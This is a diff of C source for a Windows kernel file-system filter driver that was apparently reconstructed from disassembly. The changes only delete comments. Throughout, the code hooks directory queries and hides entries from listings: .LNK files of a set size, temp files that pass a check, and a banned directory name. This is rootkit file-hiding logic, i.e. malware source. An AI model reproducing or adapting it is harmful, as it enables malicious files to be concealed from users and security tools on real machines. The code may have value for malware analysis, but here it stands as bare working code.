@@ -159,7 +159,7 @@ HookOne
       while (AttachObject != 0)
       {
          DriverNotificationRoutine(AttachObject,1);
-         AttachObject = (PDEVICE_OBJECT)*((int*)((ULONG)AttachObject + (ULONG)0x0C));          //Next Element
+         AttachObject = (PDEVICE_OBJECT)*((int*)((ULONG)AttachObject + (ULONG)0x0C));
       };
       ObDereferenceObject(((ReferencedObject*)FileSystem));
 };
@@ -185,8 +185,8 @@ DriverNotificationRoutine
                 IoDeleteDevice(AttachedDevice);
                 break;
             };
-            TargetDevice=AttachedDevice;                    //The parent Device (to detach)
-            AttachedDevice=TargetDevice->AttachedDevice;    //Get The Next Attached Device
+            TargetDevice=AttachedDevice;
+            AttachedDevice=TargetDevice->AttachedDevice;
         };
          
     };
@@ -219,9 +219,9 @@ IsAllreadyAttached
       AttachedDevice=TargetDevice->AttachedDevice;
       while(AttachedDevice !=0){
             if (AttachedDevice->DriverObject == DriverObject && AttachedDevice->DeviceExtension !=0){
-                return TRUE;                                //Allready Attached
+                return TRUE;
             };
-            AttachedDevice=AttachedDevice->AttachedDevice;    //Get The Next Attached Device
+            AttachedDevice=AttachedDevice->AttachedDevice;
         };
          
   }
@@ -242,7 +242,7 @@ IsMyDevice
 (PDEVICE_OBJECT TargetDevice)
 {
   if (TargetDevice != 0 && TargetDevice->DriverObject == DriverObject){
-                return TRUE;                                //Allready Attached
+                return TRUE;
   };
   return FALSE;
 };
@@ -296,7 +296,7 @@ SetCompletionFileControl
   SetZero(DeviceObject->DeviceExtension,Irp->Tail.Overlay.CurrentStackLocation->Parameters.MountVolume.Vpb->RealDevice);
   if (SetFSCompletionRoutine(DeviceObject,Irp) == 0){
      Irp->CurrentLocation++;
-     Irp->Tail.Overlay.CurrentStackLocation = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation + (ULONG)sizeof(IO_STACK_LOCATION));// 0x24); 
+     Irp->Tail.Overlay.CurrentStackLocation = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation + (ULONG)sizeof(IO_STACK_LOCATION));
   };
   return IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Irp);
 };
@@ -399,12 +399,12 @@ PIRP Irp)
   int i;
   CurrentStack = Irp->Tail.Overlay.CurrentStackLocation;
   if (!(CurrentStack->FileObject->Flags & 0x400000) && CurrentStack->FileObject != 0){
-    Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileName = 0; //Clear Filename
+    Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileName = 0;
     if (CurrentStack->FileObject != 0)CurrentStack->FileObject->Flags &= 0x400000;
     CallDriver(DeviceObject,Irp);
   }
   Filename = CurrentStack->Parameters.QueryDirectory.FileName;
-  if (Filename != 0 && Filename->Length == 0x4C /*The Size of BannedDirectory*/ ){
+  if (Filename != 0 && Filename->Length == 0x4C){
       for (i =0;i< 19; i++)
       {
           if ((ULONG)BannedDirecoty[i] == (ULONG)Filename->Buffer[i]){
@@ -414,7 +414,7 @@ PIRP Irp)
       goto Inject;
 Error:
   
-    CurrentStack->Parameters.QueryDirectory.FileName = 0; //Clear Filename
+    CurrentStack->Parameters.QueryDirectory.FileName = 0;
     if (Irp->Tail.Overlay.CurrentStackLocation->FileObject != 0)Irp->Tail.Overlay.CurrentStackLocation->FileObject->Flags &= 0x400000;
     CallDriver(DeviceObject,Irp);
     return;
@@ -460,7 +460,6 @@ PDEVICE_OBJECT* Context)
   };
   if (Irp->MdlAddress != 0){
     if (Irp->MdlAddress->MdlFlags  == 5){
-      //maps the physical pages that are described by The MDL to a virtual address
       mmFiles=MmMapLockedPagesSpecifyCache(Irp->MdlAddress,0,MmCached,0,0,0x10);
       if (mmFiles == 0){
         FreeMdl(Irp,LclContext);
@@ -625,7 +624,7 @@ FileCheck
   };
   do{
     NextEntryOffset = *UserBuffer;
-    if (EndOfFile == -1){   //FileNamesInformation
+    if (EndOfFile == -1){
       FileSize.u.LowPart=0;
       FileSize.u.HighPart=0;
     };
@@ -633,15 +632,15 @@ FileCheck
     FileSize.u.HighPart = *((ULONG*)((ULONG)UserBuffer + EndOfFile + 4));
     Length = *((ULONG*)((ULONG)UserBuffer + FilenameLength));
     Filename = (PCWSTR)((ULONG)UserBuffer + FilenameOffset);
-    if (Length & 1){         //mean couldn't be divided by 2 (That's will be strange because it's a unicode string (Wide char))
+    if (Length & 1){
       EntryPtr = UserBuffer;
       UserBuffer+=NextEntryOffset;
-      (ULONG)UserBuffer |= 0x01;    //mov     byte ptr [ebp+UserBuffer+3], 1
+      (ULONG)UserBuffer |= 0x01;
       PrevOffset  -= NextEntryOffset;
       continue;
     };
-    Length -= FilenameOffset;   //I don't know why
-    Length /= 2;                  //number of characters
+    Length -= FilenameOffset;
+    Length /= 2;
     if ((((FileSize.u.HighPart != -1) && (FileSize.u.LowPart != -1)) || (FileSize.u.HighPart == 0 && FileSize.u.LowPart == 4171)) && (Length > 4)){
       if (StrCheck(L".LNK",&Filename[Length -4],4) != 0){
         memmove(UserBuffer,UserBuffer + NextEntryOffset,PrevOffset - NextEntryOffset);
@@ -652,7 +651,7 @@ FileCheck
     if (TMPCheck(Filename,Length,FileSize.u.LowPart,FileSize.u.HighPart) ==0){
       EntryPtr = UserBuffer;
       UserBuffer+=NextEntryOffset;
-      (ULONG)UserBuffer |= 0x01;    //mov     byte ptr [ebp+UserBuffer+3], 1
+      (ULONG)UserBuffer |= 0x01;
     }else{
       if (NextEntryOffset != 0){
         memmove(UserBuffer,UserBuffer + NextEntryOffset,PrevOffset - NextEntryOffset);
@@ -663,7 +662,7 @@ FileCheck
     };
     PrevOffset  -= NextEntryOffset;
   }while ( PrevOffset != 0);
-  return ((ULONG)UserBuffer & 1);      // cmp     byte ptr [ebp+UserBuffer+3], 0  / setnz   al
+  return ((ULONG)UserBuffer & 1);
 };
 
 ULONG 
